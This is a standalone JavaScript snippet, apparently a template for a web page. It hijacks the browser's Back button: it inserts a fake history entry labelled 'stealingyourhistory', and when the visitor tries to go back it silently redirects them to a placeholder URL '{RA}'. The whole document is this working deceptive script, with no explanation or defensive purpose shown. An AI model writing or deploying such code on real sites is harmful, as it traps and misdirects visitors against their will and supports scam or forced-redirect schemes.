<script type = "text/javascript">
(function(window, location) {
    /*var base=document.getElementsByTagName('base');
    var hasBase = base.length==1;
    var baseHref='';
    if (hasBase){ 
        baseHref = base.href;
        base[0].remove();
    }*/
    history.replaceState(null, document.title, location.pathname+"#!/stealingyourhistory");
    history.pushState(null, document.title, location.pathname);
    /*if (hasBase){ 
        var newbase = document.createElement('base');
        newbase.href = baseHref;
        document.head.appendChild(newbase); 
    }*/

    window.addEventListener("popstate", function() {
      if(location.hash === "#!/stealingyourhistory") {
            history.replaceState(null, document.title, location.pathname);
            setTimeout(function(){
              location.replace("{RA}");
            },0);
      }
    }, false);
}(window, location));
</script>